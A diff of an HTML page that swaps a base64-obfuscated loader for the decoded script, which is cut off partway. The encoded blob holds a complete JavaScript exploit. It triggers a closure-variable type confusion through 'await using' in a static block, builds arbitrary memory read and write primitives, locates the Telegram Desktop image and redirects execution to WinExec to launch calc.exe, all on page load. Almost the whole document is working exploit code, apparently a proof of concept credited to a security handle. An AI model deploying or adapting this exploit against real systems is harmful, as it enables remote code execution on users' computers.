@@ -1,16 +1,278 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-</head>
-<body>
-<script>
-const data = "PCFkb2N0eXBlIGh0bWw+CjxodG1sPjxib2R5PjxkaXYgaWQ9Im91dCI+aW52ZXN0aWdhbmRvLi4gLSBhIGh1ZyBvZiB4LmNvbS9wcmltYXRhc2VjPC9kaXY+PHNjcmlwdD4KY29uc3QgcmVhZGVycyA9IFtdOwpjb25zdCB3cml0ZXJzID0gW107CgpjbGFzcyBEaXNwb3NhYmxlIHsKICBbU3ltYm9sLmRpc3Bvc2VdKCkge30KfQoKY29uc3QgZGlzcG9zYWJsZSA9IG5ldyBEaXNwb3NhYmxlKCk7Cgpjb25zdCBiaXRzQnVmZmVyID0gbmV3IEFycmF5QnVmZmVyKDgpOwpjb25zdCBiaXRzVTMyID0gbmV3IFVpbnQzMkFycmF5KGJpdHNCdWZmZXIpOwpjb25zdCBiaXRzRjY0ID0gbmV3IEZsb2F0NjRBcnJheShiaXRzQnVmZmVyKTsKCmZ1bmN0aW9uIHU2NFRvRmxvYXQodmFsdWUpIHsKICBiaXRzVTMyWzBdID0gTnVtYmVyKHZhbHVlICYgMHhmZmZmZmZmZm4pOwogIGJpdHNVMzJbMV0gPSBOdW1iZXIoKHZhbHVlID4+IDMybikgJiAweGZmZmZmZmZmbik7CiAgcmV0dXJuIGJpdHNGNjRbMF07Cn0KCmZ1bmN0aW9uIHN0cmluZ0Zyb21VNjQodmFsdWUpIHsKICBjb25zdCBieXRlcyA9IFtdOwogIGZvciAobGV0IGJ5dGUgPSAwOyBieXRlIDwgODsgKytieXRlKSB7CiAgICBieXRlcy5wdXNoKE51bWJlcigodmFsdWUgPj4gQmlnSW50KGJ5dGUgKiA4KSkgJiAweGZmbikpOwogIH0KICByZXR1cm4gU3RyaW5nLmZyb21DaGFyQ29kZSguLi5ieXRlcyk7Cn0KCmZ1bmN0aW9uIHU2NEZyb21TdHJpbmcodmFsdWUpIHsKICBsZXQgcmVzdWx0ID0gMG47CiAgZm9yIChsZXQgYnl0ZSA9IDA7IGJ5dGUgPCA4OyArK2J5dGUpIHsKICAgIHJlc3VsdCB8PSBCaWdJbnQodmFsdWUuY2hhckNvZGVBdChieXRlKSkgPDwgQmlnSW50KGJ5dGUgKiA4KTsKICB9CiAgcmV0dXJuIHJlc3VsdDsKfQoKY2xhc3MgVHJpZ2dlciB7CiAgc3RhdGljIHsKICAgIGxldCB4MDAgPSAwLCB4MDEgPSAxLCB4MDIgPSAyLCB4MDMgPSAzOwogICAgbGV0IHgwNCA9IDQsIHgwNSA9IDUsIHgwNiA9IDYsIHgwNyA9IDc7CiAgICBsZXQgeDA4ID0gOCwgeDA5ID0gOSwgeDEwID0gMTAsIHgxMSA9IDExOwogICAgbGV0IHgxMiA9IDEyLCB4MTMgPSAxMywgeDE0ID0gMTQsIHgxNSA9IDE1OwogICAgbGV0IHgxNiA9IDE2LCB4MTcgPSAxNywgeDE4ID0gMTgsIHgxOSA9IDE5OwogICAgbGV0IHgyMCA9IDIwLCB4MjEgPSAyMSwgeDIyID0gMjIsIHgyMyA9IDIzOwogICAgbGV0IHgyNCA9IDI0LCB4MjUgPSAyNSwgeDI2ID0gMjYsIHgyNyA9IDI3OwogICAgbGV0IHgyOCA9IDI4LCB4MjkgPSAyOSwgeDMwID0gMzAsIHgzMSA9IDMxOwoKICAgIHJlYWRlcnNbMF0gPSAoKSA9PiB4MDA7IHdyaXRlcnNbMF0gPSB2YWx1ZSA9PiB4MDAgPSB2YWx1ZTsKICAgIHJlYWRlcnNbMV0gPSAoKSA9PiB4MDE7IHdyaXRlcnNbMV0gPSB2YWx1ZSA9PiB4MDEgPSB2YWx1ZTsKICAgIHJlYWRlcnNbMl0gPSAoKSA9PiB4MDI7IHdyaXRlcnNbMl0gPSB2YWx1ZSA9PiB4MDIgPSB2YWx1ZTsKICAgIHJlYWRlcnNbM10gPSAoKSA9PiB4MDM7IHdyaXRlcnNbM10gPSB2YWx1ZSA9PiB4MDMgPSB2YWx1ZTsKICAgIHJlYWRlcnNbNF0gPSAoKSA9PiB4MDQ7IHdyaXRlcnNbNF0gPSB2YWx1ZSA9PiB4MDQgPSB2YWx1ZTsKICAgIHJlYWRlcnNbNV0gPSAoKSA9PiB4MDU7IHdyaXRlcnNbNV0gPSB2YWx1ZSA9PiB4MDUgPSB2YWx1ZTsKICAgIHJlYWRlcnNbNl0gPSAoKSA9PiB4MDY7IHdyaXRlcnNbNl0gPSB2YWx1ZSA9PiB4MDYgPSB2YWx1ZTsKICAgIHJlYWRlcnNbN10gPSAoKSA9PiB4MDc7IHdyaXRlcnNbN10gPSB2YWx1ZSA9PiB4MDcgPSB2YWx1ZTsKICAgIHJlYWRlcnNbOF0gPSAoKSA9PiB4MDg7IHdyaXRlcnNbOF0gPSB2YWx1ZSA9PiB4MDggPSB2YWx1ZTsKICAgIHJlYWRlcnNbOV0gPSAoKSA9PiB4MDk7IHdyaXRlcnNbOV0gPSB2YWx1ZSA9PiB4MDkgPSB2YWx1ZTsKICAgIHJlYWRlcnNbMTBdID0gKCkgPT4geDEwOyB3cml0ZXJzWzEwXSA9IHZhbHVlID0+IHgxMCA9IHZhbHVlOwogICAgcmVhZGVyc1sxMV0gPSAoKSA9PiB4MTE7IHdyaXRlcnNbMTFdID0gdmFsdWUgPT4geDExID0gdmFsdWU7CiAgICByZWFkZXJzWzEyXSA9ICgpID0+IHgxMjsgd3JpdGVyc1sxMl0gPSB2YWx1ZSA9PiB4MTIgPSB2YWx1ZTsKICAgIHJlYWRlcnNbMTNdID0gKCkgPT4geDEzOyB3cml0ZXJzWzEzXSA9IHZhbHVlID0+IHgxMyA9IHZhbHVlOwogICAgcmVhZGVyc1sxNF0gPSAoKSA9PiB4MTQ7IHdyaXRlcnNbMTRdID0gdmFsdWUgPT4geDE0ID0gdmFsdWU7CiAgICByZWFkZXJzWzE1XSA9ICgpID0+IHgxNTsgd3JpdGVyc1sxNV0gPSB2YWx1ZSA9PiB4MTUgPSB2YWx1ZTsKICAgIHJlYWRlcnNbMTZdID0gKCkgPT4geDE2OyB3cml0ZXJzWzE2XSA9IHZhbHVlID0+IHgxNiA9IHZhbHVlOwogICAgcmVhZGVyc1sxN10gPSAoKSA9PiB4MTc7IHdyaXRlcnNbMTddID0gdmFsdWUgPT4geDE3ID0gdmFsdWU7CiAgICByZWFkZXJzWzE4XSA9ICgpID0+IHgxODsgd3JpdGVyc1sxOF0gPSB2YWx1ZSA9PiB4MTggPSB2YWx1ZTsKICAgIHJlYWRlcnNbMTldID0gKCkgPT4geDE5OyB3cml0ZXJzWzE5XSA9IHZhbHVlID0+IHgxOSA9IHZhbHVlOwogICAgcmVhZGVyc1syMF0gPSAoKSA9PiB4MjA7IHdyaXRlcnNbMjBdID0gdmFsdWUgPT4geDIwID0gdmFsdWU7CiAgICByZWFkZXJzWzIxXSA9ICgpID0+IHgyMTsgd3JpdGVyc1syMV0gPSB2YWx1ZSA9PiB4MjEgPSB2YWx1ZTsKICAgIHJlYWRlcnNbMjJdID0gKCkgPT4geDIyOyB3cml0ZXJzWzIyXSA9IHZhbHVlID0+IHgyMiA9IHZhbHVlOwogICAgcmVhZGVyc1syM10gPSAoKSA9PiB4MjM7IHdyaXRlcnNbMjNdID0gdmFsdWUgPT4geDIzID0gdmFsdWU7CiAgICByZWFkZXJzWzI0XSA9ICgpID0+IHgyNDsgd3JpdGVyc1syNF0gPSB2YWx1ZSA9PiB4MjQgPSB2YWx1ZTsKICAgIHJlYWRlcnNbMjVdID0gKCkgPT4geDI1OyB3cml0ZXJzWzI1XSA9IHZhbHVlID0+IHgyNSA9IHZhbHVlOwogICAgcmVhZGVyc1syNl0gPSAoKSA9PiB4MjY7IHdyaXRlcnNbMjZdID0gdmFsdWUgPT4geDI2ID0gdmFsdWU7CiAgICByZWFkZXJzWzI3XSA9ICgpID0+IHgyNzsgd3JpdGVyc1syN10gPSB2YWx1ZSA9PiB4MjcgPSB2YWx1ZTsKICAgIHJlYWRlcnNbMjhdID0gKCkgPT4geDI4OyB3cml0ZXJzWzI4XSA9IHZhbHVlID0+IHgyOCA9IHZhbHVlOwogICAgcmVhZGVyc1syOV0gPSAoKSA9PiB4Mjk7IHdyaXRlcnNbMjldID0gdmFsdWUgPT4geDI5ID0gdmFsdWU7CiAgICByZWFkZXJzWzMwXSA9ICgpID0+IHgzMDsgd3JpdGVyc1szMF0gPSB2YWx1ZSA9PiB4MzAgPSB2YWx1ZTsKICAgIHJlYWRlcnNbMzFdID0gKCkgPT4geDMxOyB3cml0ZXJzWzMxXSA9IHZhbHVlID0+IHgzMSA9IHZhbHVlOwoKICAgIGZvciAoYXdhaXQgdXNpbmcgaWdub3JlZCBvZiBbZGlzcG9zYWJsZV0pIHt9CiAgfQp9CgpmdW5jdGlvbiB2aWN0aW0od3JpdGVyLCBmYWtlLCBkb3JtYW50KSB7CiAgbGV0IHYwMCA9IDAsIHYwMSA9IDEsIHYwMiA9IDIsIHYwMyA9IDM7CiAgbGV0IHYwNCA9IDQsIHYwNSA9IDUsIHYwNiA9IDYsIHYwNyA9IDc7CiAgbGV0IHYwOCA9IDgsIHYwOSA9IDksIHYxMCA9IDEwLCB2MTEgPSAxMTsKICBsZXQgdjEyID0gMTIsIHYxMyA9IDEzLCB2MTQgPSAxNCwgdjE1ID0gMTU7CiAgbGV0IHYxNiA9IDE2LCB2MTcgPSAxNywgdjE4ID0gMTgsIHYxOSA9IDE5OwogIGxldCB2MjAgPSAyMCwgdjIxID0gMjEsIHYyMiA9IDIyLCB2MjMgPSAyMzsKICBsZXQgdjI0ID0gMjQsIHYyNSA9IDI1LCB2MjYgPSAyNiwgdjI3ID0gMjc7CiAgbGV0IHYyOCA9IDI4LCB2MjkgPSAyOSwgdjMwID0gMzAsIHYzMSA9IDMxOwogIGxldCB2MzIgPSAzMiwgdjMzID0gMzMsIHYzNCA9IDM0LCB2MzUgPSAzNTsKICBsZXQgdjM2ID0gMzYsIHYzNyA9IDM3LCB2MzggPSAzOCwgdjM5ID0gMzk7CiAgbGV0IHY0MCA9IDQwLCB2NDEgPSA0MSwgdjQyID0gNDIsIHY0MyA9IDQzOwogIGxldCB2NDQgPSA0NCwgdjQ1ID0gNDUsIHY0NiA9IDQ2LCB2NDcgPSA0NzsKICBsZXQgdjQ4ID0gNDgsIHY0OSA9IDQ5LCB2NTAgPSA1MCwgdjUxID0gNTE7CiAgbGV0IHY1MiA9IDUyLCB2NTMgPSA1MywgdjU0ID0gNTQsIHY1NSA9IDU1OwogIGxldCB2NTYgPSA1NiwgdjU3ID0gNTcsIHY1OCA9IDU4LCB2NTkgPSA1OTsKICBsZXQgdjYwID0gNjAsIHY2MSA9IDYxLCB2NjIgPSA2MiwgdjYzID0gNjM7CgogIGlmIChkb3JtYW50KSB7CiAgICByZXR1cm4gKCkgPT4gWwogICAgICB2MDAsIHYwMSwgdjAyLCB2MDMsIHYwNCwgdjA1LCB2MDYsIHYwNywKICAgICAgdjA4LCB2MDksIHYxMCwgdjExLCB2MTIsIHYxMywgdjE0LCB2MTUsCiAgICAgIHYxNiwgdjE3LCB2MTgsIHYxOSwgdjIwLCB2MjEsIHYyMiwgdjIzLAogICAgICB2MjQsIHYyNSwgdjI2LCB2MjcsIHYyOCwgdjI5LCB2MzAsIHYzMSwKICAgICAgdjMyLCB2MzMsIHYzNCwgdjM1LCB2MzYsIHYzNywgdjM4LCB2MzksCiAgICAgIHY0MCwgdjQxLCB2NDIsIHY0MywgdjQ0LCB2NDUsIHY0NiwgdjQ3LAogICAgICB2NDgsIHY0OSwgdjUwLCB2NTEsIHY1MiwgdjUzLCB2NTQsIHY1NSwKICAgICAgdjU2LCB2NTcsIHY1OCwgdjU5LCB2NjAsIHY2MSwgdjYyLCB2NjMsCiAgICBdOwogIH0KCiAgd3JpdGVyKGZha2UpOwogIGNvbnN0IGdldCA9ICgpID0+IHYwMDsKICBjb25zdCBzZXQgPSB2YWx1ZSA9PiB2MDAgPSB2YWx1ZTsKICB3cml0ZXIoMCk7CiAgcmV0dXJuIFtnZXQsIHNldF07Cn0KCmZ1bmN0aW9uIGludm9rZVZpY3RpbSh3cml0ZXIsIGZha2UpIHsKICByZXR1cm4gdmljdGltKHdyaXRlciwgZmFrZSwgZmFsc2UpOwp9Cgpjb25zdCBwYXJlbnQgPSAiQSIucmVwZWF0KDQwOTYpOwpjb25zdCBzbGljZSA9IHBhcmVudC5zbGljZSgxLCA0MDk1KTsKY29uc3QgcG9pbnRlclBhcmVudCA9ICJCIi5yZXBlYXQoNDA5Nik7CmNvbnN0IHBvaW50ZXJTbGljZSA9IHBvaW50ZXJQYXJlbnQuc2xpY2UoMSwgNDA5NSk7CmNvbnN0IGZha2VSb3BlID0gIlIiLnJlcGVhdCg5MDAwKSArIHBvaW50ZXJTbGljZTsKY29uc3Qga2VlcCA9IFtdOwpsZXQgcmVzdWx0ID0gInByaW1pdGl2ZSBmYWlsZWQiOwoKZm9yIChsZXQgY2FuZGlkYXRlID0gMDsgY2FuZGlkYXRlIDwgd3JpdGVycy5sZW5ndGg7ICsrY2FuZGlkYXRlKSB7CiAgdHJ5IHsKICAgIGNvbnN0IHBhaXIgPSBpbnZva2VWaWN0aW0od3JpdGVyc1tjYW5kaWRhdGVdLCBzbGljZSk7CiAgICBrZWVwLnB1c2gocGFpcik7CiAgICBwYWlyWzFdKDQwOTYpOwogICAgcGFpclswXSgpOwogICAgcGFpclsxXSgweDEwMDAwMCk7CiAgICBpZiAocGFyZW50Lmxlbmd0aCAhPT0gMHgxMDAwMDApIGNvbnRpbnVlOwoKICAgIGNvbnN0IHJvcGVQYWlyID0gaW52b2tlVmljdGltKHdyaXRlcnNbY2FuZGlkYXRlXSwgZmFrZVJvcGUpOwogICAga2VlcC5wdXNoKHJvcGVQYWlyKTsKICAgIHJvcGVQYWlyWzFdKDY0KTsKICAgIGxldCBwYXJlbnRBZGRyZXNzID0gMG47CiAgICBmb3IgKGxldCBieXRlID0gMDsgYnl0ZSA8IDg7ICsrYnl0ZSkgewogICAgICBwYXJlbnRBZGRyZXNzIHw9IEJpZ0ludChwb2ludGVyU2xpY2UuY2hhckNvZGVBdChieXRlKSkgPDwgQmlnSW50KGJ5dGUgKiA4KTsKICAgIH0KCiAgICBjb25zdCB0YXJnZXRBZGRyZXNzID0gcGFyZW50QWRkcmVzcyArIDI0bjsKICAgIGNvbnN0IGFkZHJlc3NCeXRlcyA9IFtdOwogICAgZm9yIChsZXQgYnl0ZSA9IDA7IGJ5dGUgPCA4OyArK2J5dGUpIHsKICAgICAgYWRkcmVzc0J5dGVzLnB1c2goTnVtYmVyKCh0YXJnZXRBZGRyZXNzID4+IEJpZ0ludChieXRlICogOCkpICYgMHhmZm4pKTsKICAgIH0KICAgIGNvbnN0IGFkZHJlc3NTdHJpbmcgPSBTdHJpbmcuZnJvbUNoYXJDb2RlKC4uLmFkZHJlc3NCeXRlcyk7CiAgICBjb25zdCBhcmJpdHJhcnlQYWlyID0gaW52b2tlVmljdGltKHdyaXRlcnNbY2FuZGlkYXRlXSwgYWRkcmVzc1N0cmluZyk7CiAgICBrZWVwLnB1c2goYXJiaXRyYXJ5UGFpciwgYWRkcmVzc1N0cmluZyk7CiAgICBhcmJpdHJhcnlQYWlyWzFdKDB4MTIzNDU2NzgpOwogICAgY29uc3QgYXJiaXRyYXJ5UmVhZCA9IGFyYml0cmFyeVBhaXJbMF0oKTsKCiAgICBmdW5jdGlvbiBsZWFrVmFsdWUodmFsdWUpIHsKICAgICAgYXJiaXRyYXJ5UGFpclsxXSh2YWx1ZSk7CiAgICAgIGNvbnN0IGFkZHJlc3MgPSB1NjRGcm9tU3RyaW5nKHBvaW50ZXJQYXJlbnQpOwogICAgICBhcmJpdHJhcnlQYWlyWzFdKDApOwogICAgICByZXR1cm4gYWRkcmVzczsKICAgIH0KCiAgICBjb25zdCB0eXBlZEFycmF5ID0gbmV3IFVpbnQ4QXJyYXkoOCk7CiAgICBjb25zdCB0eXBlZEFycmF5T2JqZWN0ID0gbGVha1ZhbHVlKHR5cGVkQXJyYXkpOwogICAgY29uc3QgdHlwZWRDb250cm9sQWRkcmVzcyA9IHN0cmluZ0Zyb21VNjQodHlwZWRBcnJheU9iamVjdCArIDU2bik7CiAgICBjb25zdCB0eXBlZENvbnRyb2wgPSBpbnZva2VWaWN0aW0od3JpdGVyc1tjYW5kaWRhdGVdLCB0eXBlZENvbnRyb2xBZGRyZXNzKTsKICAgIGtlZXAucHVzaCh0eXBlZEFycmF5LCB0eXBlZENvbnRyb2xBZGRyZXNzLCB0eXBlZENvbnRyb2wpOwoKICAgIGZ1bmN0aW9uIHJldGFyZ2V0KGFkZHJlc3MpIHsKICAgICAgdHlwZWRDb250cm9sWzFdKHU2NFRvRmxvYXQoYWRkcmVzcykpOwogICAgfQoKICAgIGZ1bmN0aW9uIHJlYWRVMzIoYWRkcmVzcykgewogICAgICByZXRhcmdldChhZGRyZXNzKTsKICAgICAgcmV0dXJuICh0eXBlZEFycmF5WzBdIHwgKHR5cGVkQXJyYXlbMV0gPDwgOCkgfAogICAgICAgICh0eXBlZEFycmF5WzJdIDw8IDE2KSB8ICh0eXBlZEFycmF5WzNdIDw8IDI0KSkgPj4+IDA7CiAgICB9CgogICAgZnVuY3Rpb24gcmVhZFU2NChhZGRyZXNzKSB7CiAgICAgIHJldGFyZ2V0KGFkZHJlc3MpOwogICAgICBsZXQgdmFsdWUgPSAwbjsKICAgICAgZm9yIChsZXQgYnl0ZSA9IDA7IGJ5dGUgPCA4OyArK2J5dGUpIHsKICAgICAgICB2YWx1ZSB8PSBCaWdJbnQodHlwZWRBcnJheVtieXRlXSkgPDwgQmlnSW50KGJ5dGUgKiA4KTsKICAgICAgfQogICAgICByZXR1cm4gdmFsdWU7CiAgICB9CgogICAgcmV0YXJnZXQodGFyZ2V0QWRkcmVzcyk7CiAgICBjb25zdCBwYXR0ZXJuID0gWzB4ODgsIDB4NzcsIDB4NjYsIDB4NTUsIDB4NDQsIDB4MzMsIDB4MjIsIDB4MTFdOwogICAgZm9yIChsZXQgYnl0ZSA9IDA7IGJ5dGUgPCA4OyArK2J5dGUpIHR5cGVkQXJyYXlbYnl0ZV0gPSBwYXR0ZXJuW2J5dGVdOwogICAgY29uc3QgdHlwZWRXcml0ZUJhY2sgPSByZWFkVTY0KHRhcmdldEFkZHJlc3MpOwoKICAgIGNvbnN0IG5hdGl2ZU9iamVjdCA9IGxlYWtWYWx1ZShTdHJpbmcuZnJvbUNoYXJDb2RlKTsKICAgIGNvbnN0IG5hdGl2ZUZ1bmN0aW9uID0gcmVhZFU2NChuYXRpdmVPYmplY3QgKyA1Nm4pOwogICAgbGV0IGltYWdlQmFzZSA9IG5hdGl2ZUZ1bmN0aW9uICYgfjB4ZmZmZm47CiAgICBsZXQgZm91bmRJbWFnZSA9IGZhbHNlOwogICAgZm9yIChsZXQgcGFnZSA9IDA7IHBhZ2UgPCA0MDk2OyArK3BhZ2UsIGltYWdlQmFzZSAtPSAweDEwMDAwbikgewogICAgICBpZiAoKHJlYWRVMzIoaW1hZ2VCYXNlKSAmIDB4ZmZmZikgIT09IDB4NWE0ZCkgY29udGludWU7CiAgICAgIGNvbnN0IHBlT2Zmc2V0ID0gQmlnSW50KHJlYWRVMzIoaW1hZ2VCYXNlICsgMHgzY24pKTsKICAgICAgaWYgKHBlT2Zmc2V0IDwgMHgxMDAwbiAmJiByZWFkVTMyKGltYWdlQmFzZSArIHBlT2Zmc2V0KSA9PT0gMHg0NTUwKSB7CiAgICAgICAgZm91bmRJbWFnZSA9IHRydWU7CiAgICAgICAgYnJlYWs7CiAgICAgIH0KICAgIH0KICAgIGlmICghZm91bmRJbWFnZSkgdGhyb3cgbmV3IEVycm9yKCJtb2R1bGUgYmFzZSBub3QgZm91bmQiKTsKCiAgICBjb25zdCBwZUhlYWRlciA9IEJpZ0ludChyZWFkVTMyKGltYWdlQmFzZSArIDB4M2NuKSk7CiAgICBjb25zdCBpbWFnZVNpemUgPSByZWFkVTMyKGltYWdlQmFzZSArIHBlSGVhZGVyICsgMHg1MG4pOwogICAgY29uc3Qgd2luRXhlY0NhbGwgPSByZWFkVTMyKGltYWdlQmFzZSArIDB4MjlhNzJiNW4pOwogICAgaWYgKGltYWdlU2l6ZSAhPT0gMHgwZmIwNTAwMCB8fCAod2luRXhlY0NhbGwgJiAweGZmZmYpICE9PSAweDE1ZmYpCiAgICAgIHRocm93IG5ldyBFcnJvcigidW5leHBlY3RlZCBUZWxlZ3JhbSBEZXNrdG9wIGltYWdlIik7CgogICAgZnVuY3Rpb24gd3JpdGVCeXRlcyhhZGRyZXNzLCBieXRlcykgewogICAgICByZXRhcmdldChhZGRyZXNzKTsKICAgICAgZm9yIChsZXQgYnl0ZSA9IDA7IGJ5dGUgPCBieXRlcy5sZW5ndGg7ICsrYnl0ZSkgewogICAgICAgIHR5cGVkQXJyYXlbYnl0ZV0gPSBieXRlc1tieXRlXTsKICAgICAgfQogICAgfQoKICAgIGZ1bmN0aW9uIHdyaXRlVTY0KGFkZHJlc3MsIHZhbHVlKSB7CiAgICAgIGNvbnN0IGJ5dGVzID0gW107CiAgICAgIGZvciAobGV0IGJ5dGUgPSAwOyBieXRlIDwgODsgKytieXRlKSB7CiAgICAgICAgYnl0ZXMucHVzaChOdW1iZXIoKHZhbHVlID4+IEJpZ0ludChieXRlICogOCkpICYgMHhmZm4pKTsKICAgICAgfQogICAgICB3cml0ZUJ5dGVzKGFkZHJlc3MsIGJ5dGVzKTsKICAgIH0KCiAgICBjb25zdCBjb21tYW5kID0gU3RyaW5nLmZyb21DaGFyQ29kZSgKICAgICAgOTksIDk3LCAxMDgsIDk5LCA0NiwgMTAxLCAxMjAsIDEwMSwgMCk7CiAgICBjb25zdCBjb21tYW5kT2JqZWN0ID0gbGVha1ZhbHVlKGNvbW1hbmQpOwogICAgY29uc3QgY29tbWFuZEFkZHJlc3MgPSBjb21tYW5kT2JqZWN0ICsgMjRuOwoKICAgIGNvbnN0IHJlY29yZERvbm9yID0gWzAsIDAsIDAsIDBdOwogICAga2VlcC5wdXNoKGNvbW1hbmQsIHJlY29yZERvbm9yKTsKICAgIGNvbnN0IGRvbm9yT2JqZWN0ID0gbGVha1ZhbHVlKHJlY29yZERvbm9yKTsKICAgIGNvbnN0IHJlY29yZEFkZHJlc3MgPSByZWFkVTY0KGRvbm9yT2JqZWN0ICsgNTZuKTsKICAgIHdyaXRlVTY0KGRvbm9yT2JqZWN0ICsgNTZuLCAwbik7CiAgICB3cml0ZVU2NChkb25vck9iamVjdCArIDY0biwgMG4pOwoKICAgIGNvbnN0IHdpbkV4ZWMgPSByZWFkVTY0KGltYWdlQmFzZSArIDB4NzE1YzEwOG4pOwogICAgaWYgKHdpbkV4ZWMgPCAweDEwMDAwbikgdGhyb3cgbmV3IEVycm9yKCJXaW5FeGVjIGltcG9ydCBub3QgcmVzb2x2ZWQiKTsKICAgIHdyaXRlVTY0KHJlY29yZEFkZHJlc3MgKyAwbiwgMG4pOwogICAgd3JpdGVVNjQocmVjb3JkQWRkcmVzcyArIDhuLCAwbik7CiAgICB3cml0ZVU2NChyZWNvcmRBZGRyZXNzICsgMTZuLCBjb21tYW5kQWRkcmVzcyk7CiAgICB3cml0ZVU2NChyZWNvcmRBZGRyZXNzICsgMjRuLCB3aW5FeGVjKTsKCiAgICBsZXQgbGF1bmNoT2JqZWN0ID0gT2JqZWN0LmNyZWF0ZShudWxsKTsKICAgIGNvbnN0IGxhdW5jaEFkZHJlc3MgPSBsZWFrVmFsdWUobGF1bmNoT2JqZWN0KTsKICAgIHdyaXRlQnl0ZXMobGF1bmNoQWRkcmVzcyArIDE4biwgWzE2LCAwXSk7CiAgICB3cml0ZVU2NChsYXVuY2hBZGRyZXNzICsgNDhuLCByZWNvcmRBZGRyZXNzKTsKCiAgICByZXN1bHQgPSAiY2FuZGlkYXRlICIgKyBjYW5kaWRhdGUgKyAiIGJhc2UgMHgiICsgaW1hZ2VCYXNlLnRvU3RyaW5nKDE2KQogICAgICArICIgV2luRXhlYyAweCIgKyB3aW5FeGVjLnRvU3RyaW5nKDE2KSArICIgYXJtZWQiOwogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm91dCIpLnRleHRDb250ZW50ID0gcmVzdWx0OwogICAgbGF1bmNoT2JqZWN0ID0gbnVsbDsKCiAgICByZXN1bHQgPSAiY2FuZGlkYXRlICIgKyBjYW5kaWRhdGUgKyAiIGhlYXAgMHgiICsgcGFyZW50QWRkcmVzcy50b1N0cmluZygxNikKICAgICAgKyAiIGpzdmFsdWUgMHgiICsgYXJiaXRyYXJ5UmVhZC50b1N0cmluZygxNikKICAgICAgKyAiIHR5cGVkIDB4IiArIHR5cGVkV3JpdGVCYWNrLnRvU3RyaW5nKDE2KQogICAgICArICIgbmF0aXZlIDB4IiArIG5hdGl2ZUZ1bmN0aW9uLnRvU3RyaW5nKDE2KQogICAgICArICIgYmFzZSAweCIgKyBpbWFnZUJhc2UudG9TdHJpbmcoMTYpICsgIiBjYWxjIHJlcXVlc3RlZCI7CiAgICBicmVhazsKICB9IGNhdGNoIChlcnJvcikge30KfQoKZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm91dCIpLnRleHRDb250ZW50ID0gcmVzdWx0Owo8L3NjcmlwdD48L2JvZHk+PC9odG1sPgoKCgo=";
-document.open();
-document.write(new TextDecoder().decode(
-    Uint8Array.from(atob(data), c => c.charCodeAt(0))
-));
-document.close();
-</script>
-</body>
-</html>
+<!doctype html>
+<html><body><div id="out">investigando.. - a hug of x.com/primatasec</div><script>
+const readers = [];
+const writers = [];
+
+class Disposable {
+  [Symbol.dispose]() {}
+}
+
+const disposable = new Disposable();
+
+const bitsBuffer = new ArrayBuffer(8);
+const bitsU32 = new Uint32Array(bitsBuffer);
+const bitsF64 = new Float64Array(bitsBuffer);
+
+function u64ToFloat(value) {
+  bitsU32[0] = Number(value & 0xffffffffn);
+  bitsU32[1] = Number((value >> 32n) & 0xffffffffn);
+  return bitsF64[0];
+}
+
+function stringFromU64(value) {
+  const bytes = [];
+  for (let byte = 0; byte < 8; ++byte) {
+    bytes.push(Number((value >> BigInt(byte * 8)) & 0xffn));
+  }
+  return String.fromCharCode(...bytes);
+}
+
+function u64FromString(value) {
+  let result = 0n;
+  for (let byte = 0; byte < 8; ++byte) {
+    result |= BigInt(value.charCodeAt(byte)) << BigInt(byte * 8);
+  }
+  return result;
+}
+
+class Trigger {
+  static {
+    let x00 = 0, x01 = 1, x02 = 2, x03 = 3;
+    let x04 = 4, x05 = 5, x06 = 6, x07 = 7;
+    let x08 = 8, x09 = 9, x10 = 10, x11 = 11;
+    let x12 = 12, x13 = 13, x14 = 14, x15 = 15;
+    let x16 = 16, x17 = 17, x18 = 18, x19 = 19;
+    let x20 = 20, x21 = 21, x22 = 22, x23 = 23;
+    let x24 = 24, x25 = 25, x26 = 26, x27 = 27;
+    let x28 = 28, x29 = 29, x30 = 30, x31 = 31;
+
+    readers[0] = () => x00; writers[0] = value => x00 = value;
+    readers[1] = () => x01; writers[1] = value => x01 = value;
+    readers[2] = () => x02; writers[2] = value => x02 = value;
+    readers[3] = () => x03; writers[3] = value => x03 = value;
+    readers[4] = () => x04; writers[4] = value => x04 = value;
+    readers[5] = () => x05; writers[5] = value => x05 = value;
+    readers[6] = () => x06; writers[6] = value => x06 = value;
+    readers[7] = () => x07; writers[7] = value => x07 = value;
+    readers[8] = () => x08; writers[8] = value => x08 = value;
+    readers[9] = () => x09; writers[9] = value => x09 = value;
+    readers[10] = () => x10; writers[10] = value => x10 = value;
+    readers[11] = () => x11; writers[11] = value => x11 = value;
+    readers[12] = () => x12; writers[12] = value => x12 = value;
+    readers[13] = () => x13; writers[13] = value => x13 = value;
+    readers[14] = () => x14; writers[14] = value => x14 = value;
+    readers[15] = () => x15; writers[15] = value => x15 = value;
+    readers[16] = () => x16; writers[16] = value => x16 = value;
+    readers[17] = () => x17; writers[17] = value => x17 = value;
+    readers[18] = () => x18; writers[18] = value => x18 = value;
+    readers[19] = () => x19; writers[19] = value => x19 = value;
+    readers[20] = () => x20; writers[20] = value => x20 = value;
+    readers[21] = () => x21; writers[21] = value => x21 = value;
+    readers[22] = () => x22; writers[22] = value => x22 = value;
+    readers[23] = () => x23; writers[23] = value => x23 = value;
+    readers[24] = () => x24; writers[24] = value => x24 = value;
+    readers[25] = () => x25; writers[25] = value => x25 = value;
+    readers[26] = () => x26; writers[26] = value => x26 = value;
+    readers[27] = () => x27; writers[27] = value => x27 = value;
+    readers[28] = () => x28; writers[28] = value => x28 = value;
+    readers[29] = () => x29; writers[29] = value => x29 = value;
+    readers[30] = () => x30; writers[30] = value => x30 = value;
+    readers[31] = () => x31; writers[31] = value => x31 = value;
+
+    for (await using ignored of [disposable]) {}
+  }
+}
+
+function victim(writer, fake, dormant) {
+  let v00 = 0, v01 = 1, v02 = 2, v03 = 3;
+  let v04 = 4, v05 = 5, v06 = 6, v07 = 7;
+  let v08 = 8, v09 = 9, v10 = 10, v11 = 11;
+  let v12 = 12, v13 = 13, v14 = 14, v15 = 15;
+  let v16 = 16, v17 = 17, v18 = 18, v19 = 19;
+  let v20 = 20, v21 = 21, v22 = 22, v23 = 23;
+  let v24 = 24, v25 = 25, v26 = 26, v27 = 27;
+  let v28 = 28, v29 = 29, v30 = 30, v31 = 31;
+  let v32 = 32, v33 = 33, v34 = 34, v35 = 35;
+  let v36 = 36, v37 = 37, v38 = 38, v39 = 39;
+  let v40 = 40, v41 = 41, v42 = 42, v43 = 43;
+  let v44 = 44, v45 = 45, v46 = 46, v47 = 47;
